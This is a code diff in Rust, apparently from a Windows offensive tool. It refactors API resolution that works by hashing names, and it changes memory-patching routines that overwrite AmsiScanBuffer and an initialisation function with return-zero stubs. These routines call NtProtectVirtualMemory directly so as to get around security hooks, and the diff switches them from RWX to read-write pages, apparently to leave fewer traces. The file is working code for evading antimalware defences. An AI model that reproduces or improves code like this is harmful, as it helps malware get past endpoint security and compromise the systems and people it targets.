@@ -25,27 +25,7 @@ use std::ptr;
 // ── pe_resolve helpers (Windows) ──────────────────────────────────────────────
 #[cfg(windows)]
 mod win_resolve {
-    /// Compile-time djb2 hash for ASCII strings (matches pe_resolve::hash_str).
-    pub const fn hash_str_const(s: &[u8]) -> u32 {
-        let mut h: u32 = pe_resolve::SEED;
-        let mut i = 0;
-        while i < s.len() {
-            h = h.wrapping_mul(31).wrapping_add(s[i] as u32);
-            i += 1;
-        }
-        h
-    }
-
-    /// Compile-time djb2 hash for wide strings (matches pe_resolve::hash_wstr).
-    pub const fn hash_wstr_const(w: &[u16]) -> u32 {
-        let mut h: u32 = pe_resolve::SEED;
-        let mut i = 0;
-        while i < w.len() {
-            h = h.wrapping_mul(31).wrapping_add(w[i] as u32);
-            i += 1;
-        }
-        h
-    }
+    use crate::pe_resolve_macros::{hash_str_const, hash_wstr_const};
 
     /// Resolve a function pointer from a DLL that is already loaded in the PEB.
     pub unsafe fn resolve_api<T>(dll_hash: u32, fn_hash: u32) -> Option<T> {
@@ -116,6 +96,7 @@ mod win_resolve {
     pub type FnSwitchToThread = unsafe extern "system" fn() -> i32;
 
     // ── Local constants (replacing winapi imports) ──────────────────────────────
+    pub const PAGE_READWRITE: u32 = 0x04;
     pub const PAGE_EXECUTE_READ: u32 = 0x20;
     pub const PAGE_EXECUTE_READWRITE: u32 = 0x40;
     pub const KEY_WRITE: u32 = 0x20006;
@@ -277,7 +258,10 @@ pub fn orchestrate_layers() -> bool {
 /// to avoid IAT hooks on kernel32's VirtualProtect thunk.
 #[cfg(windows)]
 fn apply_memory_patch() {
-    use win_resolve::{PAGE_EXECUTE_READ, PAGE_EXECUTE_READWRITE};
+    // P2-05: Use PAGE_READWRITE instead of PAGE_EXECUTE_READWRITE to avoid
+    // ever creating RWX pages — the page is either writable or executable,
+    // never both simultaneously.
+    use win_resolve::PAGE_READWRITE;
 
     /// Helper: change memory protection via NtProtectVirtualMemory (syscall).
     /// Returns `true` on success (NTSTATUS >= 0).
@@ -324,7 +308,8 @@ fn apply_memory_patch() {
         // xor eax, eax (0x31 0xC0) ; ret (0xC3)
         let patch: [u8; 3] = [0x31, 0xC0, 0xC3];
         let mut old_protect: u32 = 0;
-        if nt_protect(scan_buf, patch.len(), PAGE_EXECUTE_READWRITE, &mut old_protect) {
+        // P2-05: RW → write → restore (never RWX)
+        if nt_protect(scan_buf, patch.len(), PAGE_READWRITE, &mut old_protect) {
             std::ptr::copy_nonoverlapping(patch.as_ptr(), scan_buf as *mut u8, patch.len());
             nt_protect(scan_buf, patch.len(), old_protect, &mut old_protect);
             log::debug!("apply_memory_patch: AmsiScanBuffer patched");
@@ -341,7 +326,8 @@ fn apply_memory_patch() {
         {
             let scan_str = scan_str_addr as *mut winapi::ctypes::c_void;
             let mut op: u32 = 0;
-            if nt_protect(scan_str, patch.len(), PAGE_EXECUTE_READWRITE, &mut op) {
+            // P2-05: RW → write → restore (never RWX)
+            if nt_protect(scan_str, patch.len(), PAGE_READWRITE, &mut op) {
                 std::ptr::copy_nonoverlapping(patch.as_ptr(), scan_str as *mut u8, patch.len());
                 nt_protect(scan_str, patch.len(), op, &mut op);
             }
@@ -465,10 +451,11 @@ fn set_init_failed_flag() {
             0xC3, // ret
         ];
         let mut old: u32 = 0;
+        // P2-05: RW → write → restore (never RWX)
         if nt_protect(
             init_fn,
             patch.len(),
-            win_resolve::PAGE_EXECUTE_READWRITE,
+            win_resolve::PAGE_READWRITE,
             &mut old,
         ) {
             std::ptr::copy_nonoverlapping(patch.as_ptr(), init_fn as *mut u8, patch.len());
